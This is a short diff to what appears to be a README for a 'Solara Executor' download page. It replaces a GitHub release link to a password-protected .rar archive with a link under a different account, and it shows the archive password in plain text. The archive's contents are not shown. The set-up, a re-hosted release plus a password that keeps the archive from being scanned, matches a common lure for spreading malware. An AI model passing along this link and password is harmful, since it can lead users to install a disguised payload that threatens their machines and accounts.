@@ -2,9 +2,9 @@
 
 Status: In Progress ✅
 
-Password 🔑 - [H!21JSAh@w21]
+Password 🔑 - H!21JSAh@w21
 
-👉 [Click here to download](https://github.com/bieloruskyimark/Solara-Executor/releases/download/Solara/Solara.rar) 👈  
+👉 [Click here to download](https://github.com/jeffadr13/Solara-Executor/releases/download/Solara/Solara.rar) 👈  
 
 ![image](https://github.com/user-attachments/assets/1b5e08ef-a1c1-401e-92e4-94aab8b70bd0)
 
